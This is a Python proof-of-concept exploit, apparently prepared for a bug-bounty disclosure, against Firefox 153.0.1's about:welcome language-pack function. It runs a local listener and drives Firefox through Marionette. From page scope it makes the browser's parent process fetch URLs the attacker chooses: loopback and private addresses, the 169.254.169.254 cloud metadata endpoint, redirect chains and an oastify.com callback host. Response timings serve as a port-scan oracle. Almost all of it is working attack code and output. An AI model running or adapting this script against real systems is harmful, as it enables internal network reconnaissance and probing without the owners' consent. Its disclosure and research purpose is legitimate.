#!/usr/bin/env python3
"""
Firefox 153.0.1 — AWEnsureLangPackInstalled parent-process blind SSRF + port-scan oracle.

Run:  python3 poc.py       (edit FF_BIN / COLLAB_URL below first)

  1. starts an HTTP listener on 0.0.0.0:8798 (also serves /redir -> 302 -> hop2)
  2. launches Firefox 153.0.1 directly on about:welcome with Marionette
  3. from PAGE SCOPE calls AWEnsureLangPackInstalled with attacker-chosen URLs
  4. prints the timing table (open / closed / filtered) and the captured requests

Everything here runs in content/page scope — no chrome privileges are used.
"""
import http.server, socketserver, json, os, shutil, socket
import subprocess, sys, tempfile, threading, time

FF_BIN     = "/home/sn0x/bb/targets/ff-nightly-hunt/firefox/firefox"
COLLAB_URL = "f2ilsqdc6ik7pe13a947buonler6fx3m.oastify.com"

PORT, MPORT = 8798, 2828
RED, GRN, YEL, DIM, RST = "\033[91m", "\033[92m", "\033[93m", "\033[2m", "\033[0m"
HITS = []

class H(http.server.BaseHTTPRequestHandler):
    def _dump(self, note=""):
        HITS.append({"path": self.path, "cookie": self.headers.get("Cookie"),
                     "ua": self.headers.get("User-Agent"),
                     "sfs": self.headers.get("Sec-Fetch-Site")})
        print(f"\n{GRN}{'='*74}{RST}")
        print(f"{GRN}{self.command} {self.path} {self.request_version} {note}{RST}")
        for k, v in self.headers.items():
            if k.lower() == "cookie":
                print(f"  {RED}{k}: {v}{RST}")
            elif k.lower() in ("user-agent", "sec-fetch-site"):
                print(f"  {YEL}{k}: {v}{RST}")
            else:
                print(f"  {DIM}{k}: {v}{RST}")
        print(f"{GRN}{'='*74}{RST}")
    def do_GET(self):
        if self.path.startswith("/redir"):
            self._dump("(hop 1 -> 302)")
            self.send_response(302)
            self.send_header("Location", f"http://127.0.0.1:{PORT}/REDIR-HOP2-INTERNAL")
            self.end_headers(); return
        if self.path.startswith("/setcookie"):
            self._dump(); b = b"ok"
            self.send_response(200)
            self.send_header("Set-Cookie", "lpsess=LANGPACK_VICTIM_COOKIE; Path=/")
            self.send_header("Content-Length", str(len(b))); self.end_headers()
            self.wfile.write(b); return
        self._dump(); b = b"NOT-A-REAL-XPI"
        self.send_response(200)
        self.send_header("Content-Type", "application/x-xpinstall")
        self.send_header("Content-Length", str(len(b))); self.end_headers()
        self.wfile.write(b)
    do_HEAD = do_GET
    def log_message(self, *a): pass

def start_listener():
    socketserver.TCPServer.allow_reuse_address = True
    srv = socketserver.TCPServer(("0.0.0.0", PORT), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv

class Marionette:
    def __init__(self, host="127.0.0.1", port=MPORT, timeout=120):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout); self.buf = b""; self.msgid = 0; self._read()
    def _read(self):
        while b":" not in self.buf:
            c = self.sock.recv(65536)
            if not c: raise IOError("closed")
            self.buf += c
        ln, _, rest = self.buf.partition(b":"); n = int(ln)
        while len(rest) < n:
            c = self.sock.recv(65536)
            if not c: raise IOError("closed")
            rest += c
        self.buf = rest[n:]
        return json.loads(rest[:n])
    def cmd(self, name, params=None):
        self.msgid += 1
        raw = json.dumps([0, self.msgid, name, params or {}]).encode()
        self.sock.sendall(str(len(raw)).encode() + b":" + raw)
        while True:
            m = self._read()
            if m[0] == 1 and m[1] == self.msgid:
                if m[2]: raise RuntimeError(f"{name} -> {m[2]}")
                return m[3]

def launch(profile):
    os.makedirs(profile, exist_ok=True)
    with open(os.path.join(profile, "user.js"), "w") as f:
        f.write('user_pref("marionette.enabled", true);\n')
        f.write('user_pref("remote.active-protocols", 2);\n')
        f.write('user_pref("browser.shell.checkDefaultBrowser", false);\n')
    # NOTE: about:welcome must be the STARTUP url — WebDriver:Navigate refuses it.
    p = subprocess.Popen([FF_BIN, "--marionette", "--no-remote", "--profile", profile,
                          "about:welcome"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         start_new_session=True)
    for _ in range(60):
        time.sleep(1)
        try:
            socket.create_connection(("127.0.0.1", MPORT), timeout=2).close(); return p
        except OSError:
            continue
    raise SystemExit("marionette never came up")

CALL_JS = r"""
const w = window.wrappedJSObject || window;
const done = arguments[arguments.length - 1];
if (typeof w.AWEnsureLangPackInstalled !== "function") { done("NO-SINK"); }
else {
  const arg = (w.JSON || JSON).parse(arguments[0]);
  const t0 = Date.now();
  try {
    Promise.resolve(w.AWEnsureLangPackInstalled(arg, (w.JSON||JSON).parse("{}")))
      .then(() => done("resolved|" + (Date.now() - t0)),
            () => done("rejected|" + (Date.now() - t0)));
    setTimeout(() => done("timeout|" + (Date.now() - t0)), 30000);
  } catch (e) { done("threw|0"); }
}
"""

def main():
    if FF_BIN.startswith("/path/to"):
        sys.exit("edit FF_BIN at the top of this file first")
    collab = COLLAB_URL if not COLLAB_URL.startswith("YOUR_") else None

    start_listener(); print(f"listener up on 0.0.0.0:{PORT}")
    prof = tempfile.mkdtemp(prefix="lppoc-"); print(f"profile: {prof}")
    proc = launch(prof)
    try:
        m = Marionette()
        m.cmd("WebDriver:NewSession", {"capabilities": {}})
        m.cmd("WebDriver:SetTimeouts", {"script": 90000})
        m.cmd("Marionette:SetContext", {"value": "content"})
        time.sleep(2)
        url_now = m.cmd("WebDriver:GetCurrentURL", {})["value"]
        print(f"page: {url_now}")
        if "about:welcome" not in url_now:
            print(f"{YEL}warning: not on about:welcome{RST}")

        def call(url):
            payload = json.dumps({
                "langPack": {"url": url, "hash": "sha256:" + "0" * 64,
                             "target_locale": "zz-ZZ"},
                "requestSystemLocales": ["en-US"], "langPackDisplayName": "probe"})
            try:
                return m.cmd("WebDriver:ExecuteAsyncScript",
                             {"script": CALL_JS, "args": [payload]})["value"]
            except Exception as e:
                return "ERR|0 " + str(e)[:60]

        rows = [
            ("loopback OPEN",          f"http://127.0.0.1:{PORT}/LANGPACK-SSRF"),
            ("RFC1918 OPEN",           f"http://10.0.2.15:{PORT}/RFC1918-OPEN"),
            ("loopback CLOSED :9",     "http://127.0.0.1:9/CLOSED-PORT"),
            ("filtered 10.255.255.1",  "http://10.255.255.1:80/FILTERED"),
            ("metadata 169.254.169.254", "http://169.254.169.254/latest/meta-data/"),
            ("redirect /redir",        f"http://127.0.0.1:{PORT}/redir"),
        ]
        if collab:
            rows.append(("collab http", f"http://{collab}/LANGPACK-SSRF-HTTP"))
            rows.append(("collab https", f"https://{collab}/LANGPACK-SSRF-HTTPS"))

        print("\n--- port-scan timing oracle (from PAGE SCOPE) ---")
        print(f"  {'target':<26}{'elapsed':>10}   settle")
        print("  " + "-" * 50)
        table = []
        for label, url in rows:
            r = call(url)
            settle, _, ms = r.partition("|")
            table.append((label, ms, settle))
            print(f"  {label:<26}{ms + 'ms':>10}   {settle}")
            time.sleep(0.4)

        time.sleep(2)
        paths = [h["path"] for h in HITS]
        print("\n" + "=" * 74)
        internal = [p for p in paths if p.startswith("/LANGPACK-SSRF")]
        rfc = [p for p in paths if p.startswith("/RFC1918-OPEN")]
        hop2 = [p for p in paths if p.startswith("/REDIR-HOP2-INTERNAL")]
        cookies = {h["cookie"] for h in HITS}
        if internal:
            print(f"{GRN}CONFIRMED{RST} — parent process fetched attacker-supplied URLs:")
            for p in paths: print(f"    {p}")
            print(f"  RFC1918 reached      : {'YES' if rfc else 'no'}")
            print(f"  redirect hop2 reached: {'YES' if hop2 else 'no'}")
            print(f"  cookies attached     : {cookies}  (expected {{None}} — anonymous)")
            print(f"\n  {YEL}NOTE:{RST} all rows 'reject' — that is the post-download signature")
            print( "        failure, NOT a pre-fetch block. The request already left.")
            print(f"  {YEL}NOTE:{RST} no code execution — LANGPACKS_REQUIRE_SIGNING is frozen true")
            print( "        on branded release builds (AddonSettings.sys.mjs:32-34).")
        else:
            print(f"{RED}FAILED{RST} — no parent fetch captured. paths={paths}")
        if collab:
            print(f"\n  check your Collaborator for /LANGPACK-SSRF-HTTP and /LANGPACK-SSRF-HTTPS")
        print("=" * 74)
    finally:
        try:
            os.killpg(os.getpgid(proc.pid), 15)     # whole process group, not just the wrapper
        except Exception:
            try: proc.terminate()
            except Exception: pass
        for _ in range(20):
            if proc.poll() is not None: break
            time.sleep(1)
        shutil.rmtree(prof, ignore_errors=True)

if __name__ == "__main__":
    main()
